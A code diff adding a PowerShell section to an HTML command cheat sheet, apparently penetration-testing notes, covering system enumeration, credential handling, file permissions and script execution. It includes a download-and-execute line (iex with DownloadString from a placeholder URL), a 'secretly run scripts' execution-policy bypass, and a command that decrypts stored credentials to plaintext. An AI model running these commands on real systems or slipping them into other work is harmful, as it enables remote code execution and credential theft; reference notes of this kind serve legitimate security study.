@@ -399,8 +399,113 @@
     </table>
 
     <h2>Powershell</h2>
-
-
+    <li>System Information & Control</li>
+    <table>
+        <tr>
+            <td>Enumerate drivers</td>
+            <td>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path</td>
+        </tr>
+        <tr>
+            <td>Enumerate driver versions</td>
+            <td>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</td>
+        </tr>
+        <tr>
+            <td>Check operating system architecture</td>
+            <td>[environment]::Is64BitOperatingSystem</td>
+        </tr>
+        <tr>
+            <td>Check powershell session architecture</td>
+            <td>[environment]::Is64BitProcess<br>
+                <li>64-bit powershell</li>
+                <ul>
+                    <li>C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Environment variabels</td>
+            <td>dir env:</td>
+        </tr>
+        <tr>
+            <td>Get time & date</td>
+            <td>Get-Date</td>
+        </tr>
+        <tr>
+            <td>Check execution mode</td>
+            <td>$ExecutionContext.SessionState.LanguageMode</td>
+        </tr>
+        <tr>
+            <td>Powershell history</td>
+            <td>C:\Users\&lt;user&gt;\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</td>
+        </tr>
+    </table>
+    <li>Applications & Services</li>
+    <li>User & Group Permissions</li>
+    <table>
+        <tr>
+            <td>Create Credential Variable</td>
+            <td>$pass = ConvertTo-SecureString &#039;&lt;password&gt;&#039; -AsPlainText -Force<br>$cred = New-Object System.Management.Automation.PSCredential(&#039;&lt;Username&gt;&#039;, $pass)</td>
+        </tr>
+        <tr>
+            <td>Decrypt SecureString password to plaintext from CLI XML file.</td>
+            <td>(Import-CliXml -Path user.txt).GetNetworkCredential().Password</td>
+        </tr>
+        <tr>
+            <td>Query user information</td>
+            <td>Get-ADUser &lt;user&gt; [-properties *]</td>
+        </tr>
+        <tr>
+            <td>View service permissions</td>
+            <td>$acl = get-acl HKLM:\System\CurrentControlSet\Services<br>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}</td>
+        </tr>
+    </table>
+    <li>File System</li>
+    <table>
+        <tr>
+            <td>Read file content</td>
+            <td>Get-Content &lt;file name&gt;<br>gc &lt;file name&gt;</td>
+        </tr>
+        <tr>
+            <td>Check file/folder permissions</td>
+            <td>Get-ACL &lt;file/folder&gt; | Fl *</td>
+        </tr>
+        <tr>
+            <td>View file contents</td>
+            <td>(Get-Content &lt;file&gt;).substring(0,16)</td>
+        </tr>
+        <tr>
+            <td>Search for file</td>
+            <td>Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force</td>
+        </tr>
+        <tr>
+            <td>Recursively show file names</td>
+            <td>gci -recurse | select FullName</td>
+        </tr>
+        <tr>
+            <td>Show only files</td>
+            <td>gci -File</td>
+        </tr>
+        <tr>
+            <td>Ignore errors</td>
+            <td>-ErrorAction SilentlyContinue<br>ErrorAction ignore</td>
+        </tr>
+    </table>
+<li>Networking</li>
+<li>Miscellaneous</li>
+<table>
+    <tr>
+        <td>Secretly run scripts</td>
+        <td>powershell.exe -ExecutionPolicy Bypass –NoLogo –NonInteractive –NoProfile –File &lt;file.ps1&gt;</td>
+    </tr>
+    <tr>
+        <td>enable colors</td>
+        <td>reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</td>
+    </tr>
+    <tr>
+        <td>dot-source / load all variables & functions from powershell script</td>
+        <td>.\&lt;script&gt;.ps1<br>iex (New-Object System.Net.Webclient).DownloadString(&#039;https://website.com/url/to/file.ps1&#039;)</td>
+    </tr>
+</table>
 
 
 
